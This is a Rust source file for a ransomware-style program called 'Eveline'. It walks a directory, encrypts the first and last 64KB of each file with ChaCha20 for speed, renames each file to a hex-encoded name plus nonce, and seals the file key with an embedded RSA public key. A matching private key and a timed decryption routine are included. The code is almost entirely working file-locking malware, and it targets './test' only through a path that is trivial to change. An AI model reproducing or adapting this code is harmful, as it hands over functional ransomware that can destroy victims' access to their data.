use anyhow::Result;
use chacha20::{
    cipher::{KeyIvInit, StreamCipher},
    ChaCha20, Key, Nonce,
};
use rand::rngs::OsRng;
use rand::Rng;
use rsa::{
    pkcs8::{DecodePrivateKey, DecodePublicKey},
    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
};
use std::io::{BufReader, Error, ErrorKind};
use std::io::{Read, Seek, SeekFrom, Write};
use std::path::Path;
use std::{
    fs::{File, OpenOptions},
    os::unix::prelude::OsStrExt,
};
use walkdir::WalkDir;

fn generate_random(length: usize) -> Vec<u8> {
    let mut random = vec![0u8; length];
    OsRng.fill(&mut random[..]);
    random
}



// TODO: Implement file name compression with https://docs.rs/lzw/latest/lzw/ 
fn encrypt_file(path: &Path, key: &[u8]) -> std::io::Result<()> {
    let nonce = generate_random(12);

    // Read the first 64KB of the file
    let mut file = File::open(path)?;
    let mut buffer = vec![0u8; 64 * 1024];
    let read_bytes = file.read(&mut buffer)?;
    buffer.truncate(read_bytes);

    let file_size = file.metadata()?.len() as usize > 65536 ; //64KB
    // Read the last 64KB of the file
    let mut last_buffer = vec![0u8; 64 * 1024];
    if file_size{
        file.seek(SeekFrom::End(-64 * 1024))?; // Move the file pointer to the last 64KB
        let last_read_bytes = file.read(&mut last_buffer)?;
        last_buffer.truncate(last_read_bytes);
    }
    drop(file); // Close the file after reading

    // Initialize cipher
    let key = Key::from_slice(key);
    let nonce = Nonce::from_slice(&nonce);
    let mut cipher = ChaCha20::new(&key, &nonce);
    // Encrypt first 64KB
    cipher.apply_keystream(&mut buffer);
    //Encrypt last 64KB
    if file_size {
        cipher.apply_keystream(&mut last_buffer);
    }

    // Write the encrypted data back to the file
    let mut file = OpenOptions::new().write(true).open(path)?; // Reopen the file for writing without truncating it
    file.seek(SeekFrom::Start(0))?; // Move the file pointer to the beginning
    file.write_all(&buffer)?;

    if file_size {
        file.seek(SeekFrom::End(-64 * 1024))?; // Move the file pointer to the end
        file.write_all(&last_buffer)?;
    }

    file.flush()?;

    let file_name = match path.file_name() {
        Some(file_name) => file_name,
        None => {
            // handle the error case here
            return Err(Error::new(ErrorKind::Other, "error getting path name"));
        }
    };

    // Hex encode the original file name and nonce
    let file_name_hex = hex::encode(file_name.as_bytes());
    let nonce_hex = hex::encode(nonce);

    // Concatenate them using the separator
    let new_path = path.with_file_name(format!("{}_{}", file_name_hex, nonce_hex));
    std::fs::rename(path, &new_path)?;

    Ok(())
}

fn decrypt_file(path: &Path, key: &[u8]) -> std::io::Result<()> {
    // Extract the hex-encoded file name and nonce from the encrypted file name

    let file_name = match path.file_name() {
        Some(file_name) => file_name,
        None => {
            // handle the error case here
            return Err(Error::new(ErrorKind::Other, "error getting path name"));
        }
    };

    let file_stem = file_name.to_string_lossy();
    let nonce_hex = match file_stem.rsplitn(2, '_').next() {
        Some(nonce_hex) => nonce_hex,
        None => {
            // handle the error case here
            return Err(Error::new(ErrorKind::Other, "error getting nonce hex"));
        }
    };

    let file_name_hex = match file_stem.rsplitn(2, '_').nth(1) {
        Some(file_name_hex) => file_name_hex,
        None => {
            // handle the error case here
            return Err(Error::new(ErrorKind::Other, "error getting file name hex"));
        }
    };

    // Hex decode the file name and nonce
    let file_name_decoded = match hex::decode(file_name_hex) {
        Ok(file_name) => file_name,
        Err(e) => {
            // Handle the error case here
            return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, e));
        }
    };
    let original_file_name = match String::from_utf8(file_name_decoded) {
        Ok(file_name) => file_name,
        Err(e) => {
            // Handle the error case here
            return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, e));
        }
    };

    let nonce = match hex::decode(nonce_hex) {
        Ok(vec) => vec,
        Err(e) => {
            // Handle the error case here
            return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, e));
        }
    };

    // Read the first 64KB of the file
    let mut file = File::open(path)?;
    let mut buffer = vec![0u8; 64 * 1024];
    let read_bytes = file.read(&mut buffer)?;
    buffer.truncate(read_bytes);

    let file_size = file.metadata()?.len() as usize > 65536; //64KB
    let mut last_buffer = vec![0u8; 64 * 1024];

    if file_size {
        // Read the last 64KB of the file
        file.seek(SeekFrom::End(-64 * 1024))?; // Move the file pointer to the last 64KB
        let last_read_bytes = file.read(&mut last_buffer)?;
        last_buffer.truncate(last_read_bytes);
    }
    drop(file); // Close the file after reading

    // Initialize cipher
    let key = Key::from_slice(key);
    let nonce = Nonce::from_slice(&nonce);
    let mut cipher = ChaCha20::new(&key, &nonce);
    // Decrypt first 64KB
    cipher.apply_keystream(&mut buffer);
    // Decrypt last 64KB
    if file_size {
        cipher.apply_keystream(&mut last_buffer);
    }
    // Write the decrypted data back to the file
    let mut file = OpenOptions::new().write(true).open(path)?; // Reopen the file for writing without truncating it
    file.seek(SeekFrom::Start(0))?; // Move the file pointer to the beginning
    file.write_all(&buffer)?;
    if file_size {
        file.seek(SeekFrom::End(-64 * 1024))?; // Move the file pointer to the end
        file.write_all(&last_buffer)?;
    }
    file.flush()?;

    // Rename the file back to its original name without the nonce
    let original_path = path.with_file_name(original_file_name);
    std::fs::rename(path, &original_path)?;

    Ok(())
}

const PRIVATE_KEY: &str = "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQD5rEXhPw1UA7zf\ndvAXkKw89kYfwjBsttTuIny2LevppxAPE+m9xD82uWZ4IhIMEJa9mTBpFTrq5t0q\nw6r6KZr/0e4VjaTIB+WkD+ojJT7YalIOZm8Nenh2sYFyyLLuuiPnqN5eeEYeuntJ\nrC35PUX0HJyRGbFfbLcRBM/hBn6pe7Nfc5XjbvQGeoQ7rGqInMW9y13qDQ6ifh3I\n0/DISpIuWRzUUjLRbIFYcZ6u3rLbfMuWGClRc3+vlzfZmZEbdzmyRRT/YQH3quO5\nh6cVudPYnz/mNfd/Fua1457pDyK+HlmmaMz7FYRBXUsrm5LdfjAkmjeoEzti1VyM\nmGaxgmV3AgMBAAECggEAYI44JCkfPWuIop87sNFZWuYfLm8KDTET3dhmhInz31Ol\niT85ORNpIv/GWhVLB3Fu6noQ18LHG0sXI0+ykrZ+ZArK2XkCzf0H2U/yS48+47ES\ndNE2h27ioXx6RGrLkDlaY1/SR5SaAY462b4FtYr1v7dE8XSPPQktLx6+ShcZ6u7R\nXu/i8iOoXS8VIynD2m0EKBccWVCR2QhnmlK8bWXlZwR4E1l58cKt1EI+z558Fit4\nv69YnVqlljp5GabMs7PolO/lNvnJYLyBJoZP7+ZMQ7HVt3Znb8ON/pWooCREGbF4\nrgG8iai6iaiV88h8inewZG0SAHTKR8REq4woD6m8yQKBgQD8Iy7w11SucoF0E2i1\nowanHdF2iGNoeMgcJYLGITZ5dRjevcGmOniJeXybvpmeBG6mjkR9fujgnFjWgECx\nJsDh0B0x3VJ1SBjiFIjFWhCI7yuiJiTw9L7AmJWvdONh2RNtUden7kz3zLrU5/Wg\nfu8KKW9EmdgGPZNwNWMUUzAiNQKBgQD9f2ystAoV5Qaa03seUKJOIIOM77LErk8q\naCJXuvadao7yEAtPHW0efw0Pccl5HMEB0Xl4Pdub0vPii2/mkRVyoaNtIP8Kopoy\n/FdO1nSydA+yYf+QBzp3M2XhvTrPocROV4McBq4QF8x0QrbsMDHuZXOrZYNEnTJd\nJWn9g9jeewKBgQDIX2WEfHuNju4Vwv7pqj81O9skacsmUSYmSCEfN3HFICu9h+uH\nINx91BAU7WnDTB5rOpBvcxW6ukVXYeEHZ5bNXch1wj8veTZdJJh0zdhqGjgAynN9\nEeMtx5TdNPUm444uyGWrzRNZslefrx9ihr2Mw9TrHZ+xhenPuH2ev2V3KQKBgHe8\n9Kwu7oShBZmkQwdytveITBsKLbrRSvuQ7Ifb/Bkm+BZGldDs6Vn6UUT2TmAywMgH\nFgVB0rWr0x8zFcwmw6a9yuAFMfLoE0X6A5NtoPmZ8MAlof16LJeZY4pZQ6pHkt4e\nYAOg9B8N3rkbuiOeMDeXHCfdbz+9sMhmn8XrvUh5AoGAf0ojfjZSeQendZuY6VFc\nNhJVyj6DpbKi7HfUAcO4rfvd9KzA36YN6CF3dh70hxnOCZDhrk2Iv3yOwOgO5lGk\nb//x5NNLUF1ReGWiExxF080eflR3GQun4LtooNdyXlJO1a835U9rIUCxfmk+mCgV\nRblUWQRjMPQkBLUb4amsD8U=\n-----END PRIVATE KEY-----\n";
const PUBLIC_KEY: &str = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA+axF4T8NVAO833bwF5Cs\nPPZGH8IwbLbU7iJ8ti3r6acQDxPpvcQ/NrlmeCISDBCWvZkwaRU66ubdKsOq+ima\n/9HuFY2kyAflpA/qIyU+2GpSDmZvDXp4drGBcsiy7roj56jeXnhGHrp7Sawt+T1F\n9ByckRmxX2y3EQTP4QZ+qXuzX3OV4270BnqEO6xqiJzFvctd6g0Oon4dyNPwyEqS\nLlkc1FIy0WyBWHGert6y23zLlhgpUXN/r5c32ZmRG3c5skUU/2EB96rjuYenFbnT\n2J8/5jX3fxbmteOe6Q8ivh5ZpmjM+xWEQV1LK5uS3X4wJJo3qBM7YtVcjJhmsYJl\ndwIDAQAB\n-----END PUBLIC KEY-----\n";

fn encrypt_data(pub_key: &RsaPublicKey, data: &[u8]) -> Result<Vec<u8>> {
    let mut rng = OsRng;
    Ok(pub_key.encrypt(&mut rng, Pkcs1v15Encrypt, &data[..])?)
}

fn decrypt_data(priv_key: &RsaPrivateKey, enc_data: &[u8]) -> Result<Vec<u8>> {
    Ok(priv_key.decrypt(Pkcs1v15Encrypt, &enc_data)?)
}

fn write_to_file(file_path: &str, content: &Vec<u8>) -> std::io::Result<()> {
    let mut file = File::create(file_path)?;
    file.write_all(content)?;
    Ok(())
}

fn read_from_file(file_path: &str) -> std::io::Result<Vec<u8>> {
    let file = File::open(file_path)?;
    let mut buf_reader = BufReader::new(file);
    let mut contents = Vec::new();
    buf_reader.read_to_end(&mut contents)?;
    Ok(contents)
}

fn start_encryption() -> Result<()> {
    let key = generate_random(32);

    for file in WalkDir::new("./test")
        .into_iter()
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_file())
    {
        let path = file.into_path();

        encrypt_file(&path, &key)
            .unwrap_or_else(|e| eprintln!("Error encrypting {}: {}", path.display(), e));
    }

    let pub_key = RsaPublicKey::from_public_key_pem(PUBLIC_KEY).unwrap();

    let enc_data: Vec<u8> = encrypt_data(&pub_key, &key[..])?;
    let _res = write_to_file("./key.txt", &enc_data);
    Ok(())
}

fn start_decryption() -> Result<()> {
    let priv_key = RsaPrivateKey::from_pkcs8_pem(PRIVATE_KEY).unwrap();

    let enc_key = read_from_file("./key.txt").unwrap();
    let key = decrypt_data(&priv_key, &enc_key)?;
    for file in WalkDir::new("./test")
        .into_iter()
        .filter_map(Result::ok)
        .filter(|e| {
            e.file_type().is_file()
                && e.path()
                    .file_name()
                    .and_then(|file_name| file_name.to_str())
                    .map(|file_name_str| !file_name_str.contains('.'))
                    .unwrap_or(false)
        })
    {
        let path = file.into_path();

        decrypt_file(&path, &key)
            .unwrap_or_else(|e| eprintln!("Error decrypting {}: {}", path.display(), e));
    }
    Ok(())
}

fn main() {
    use std::time::Instant;
    println!("\nStarting Eveline\n");

    // benchmark encryption time
    let start = Instant::now();
    start_encryption().unwrap_or_else(|e| eprintln!("Error start encryption {e}"));
    let finish = start.elapsed();
    println!("Encryption time: {finish:.2?}\n");

    // benchmark decryption time
    let start = Instant::now();
    start_decryption().unwrap_or_else(|e| eprintln!("Error start decryption {e}"));
    let finish = start.elapsed();
    println!("Decryption time: {finish:.2?}\n");
}
